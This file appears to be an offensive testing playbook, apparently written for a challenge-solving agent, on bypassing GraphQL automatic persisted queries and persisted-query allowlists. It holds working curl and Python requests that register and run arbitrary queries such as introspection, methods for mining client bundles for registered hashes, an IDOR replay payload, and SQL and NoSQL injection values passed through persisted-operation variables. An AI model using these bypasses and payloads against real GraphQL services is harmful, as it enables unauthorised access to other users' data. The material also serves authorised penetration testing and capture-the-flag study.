# Persisted queries — APQ and allowlist bypasses

Automatic Persisted Queries (APQ) and persisted-query allowlists restrict the
endpoint to *pre-registered* operations. Free-form queries get rejected with
`PersistedQueryNotAllowed`/`PersistedQueryNotFound`. This file covers the
detection and the bypass surfaces.

---

## 1. Detection

```json
{"errors":[{"message":"PersistedQueryNotFound","extensions":{"code":"PERSISTED_QUERY_NOT_FOUND"}}]}
{"errors":[{"message":"PersistedQueryNotAllowed"}]}
{"errors":[{"message":"Only persisted queries allowed"}]}
```

Once any of those appear — free-form docs are dead by design. Every probe now
works through hash-exchange or registration abuse.

## 2. The APQ protocol — three-leg exchange

```bash
# 1. client sends hash only — server has never seen it
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d '{
  "extensions":{"persistedQuery":{"version":1,
    "sha256Hash":"<sha256-of-query>"}}}'

# → PersistedQueryNotFound — server asks for the doc

# 2. client sends hash + full query — server registers it
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d '{
  "query":"{me{email}}",
  "extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}'

# → server caches hash→doc, executes it

# 3. future requests — hash only executes the cached doc
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d '{
  "extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}'
```

**The key observation**: step 2 accepts *any* document with *any* hash — the
server just caches the pair. If the deployment uses APQ-as-cache (not a
strict allowlist), **the registration step is a free pass**: register any
query, then run it.

## 3. APQ-as-cache bypass

```python
import hashlib, json, requests
doc = "{__schema{types{name}}}"
h = hashlib.sha256(doc.encode()).hexdigest()
r = requests.post(URL, json={
  "query": doc,
  "extensions":{"persistedQuery":{"version":1,"sha256Hash":h}}})
# server registers and EXECUTES — introspection just ran past the gate
```

The gate is only strict when it *refuses* unregistered hashes. The probe:
send a hash with NO query — `PersistedQueryNotFound` means it accepts
registration; `PersistedQueryNotAllowed` means allowlist-enforced.

## 4. Strict allowlist — what's left

When only pre-registered hashes run:

- **Hash collision / cache poisoning**: register `hash(X)=h` where the
  server holds `h→docA`. If the store trusts your registration for a hash
  that maps elsewhere — the doc gets replaced. SHA256 makes this theoretical;
  MD5/short-hash caches are the real target.
- **Hash enumeration**: guess known operation hashes — the client app's
  *own* ops have hashes that are registered. Mine the bundle for
  `persistedQueryManifest` files or `{"id":"<sha>"}` literals — they name
  the registered operations. Then replay those exact hashes with *different
  variables* — `{"query":null,"variables":{...},"extensions":{"persistedQuery":{"sha256Hash":"<stolen>"}}}` — the registered doc runs with hostile args.
- **Operation-name confusion**: some allowlists key on `operationName` not
  hash — send `operationName:"GetUsers"` with a different `query` — lax
  validators run the doc.

## 5. Relay-style `text:null` persisted ops

Relay uses `{"id":"<md5-or-name>","text":null}` — the server maps id→doc.
Enumerate ids from the bundle's `relay/` artifacts or `*.graphql.json`
manifests; replay the id with modified `variables`:

```json
{"id":"a1b2c3","text":null,"variables":{"id":"OTHER_USER_ID"}}
```

The registered doc is fixed but **variables are not** — a `GetUser` doc with
a hostile `id` variable is a full IDOR replay through the allowlist.

## 6. Variable-side injection through persisted ops

The registered doc's shape is fixed; variables are attacker input:

```json
{"extensions":{"persistedQuery":{"sha256Hash":"<GetUser-hash>"}},
 "variables":{"id":"1' OR 1=1--"}}
{"id":"<relay-id>","variables":{"userId":"admin","limit":99999,
  "filter":{"$ne":null}}}
```

The allowlist protects the *query shape*, never the *variables* — the same
injection surface remains on every argument, just with the doc pre-blessed.

## 7. Man-in-the-middle queries via CDN cache

APQ hashes become cache keys — `GET /graphql?extensions={...hash}` — CDN-
cached registered queries. Registered queries returning *private* data +
shared CDN = `skills/web-cache-poisoning/` surface.

## 8. Detection recap + decision tree

```text
response contains PersistedQuery*?
├─ yes → send hash+doc for a hostile query
│        ├─ executes? → APQ-as-cache — free registration bypass
│        └─ refused? → strict allowlist → mine bundle for registered
│                     hashes/ids → replay with hostile variables
└─ no → free-form docs work — normal flow
```

## 9. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "APQ gate — hash registration free (cache not allowlist)"
```

The bypass is the registration, not the query — record which leg ran.
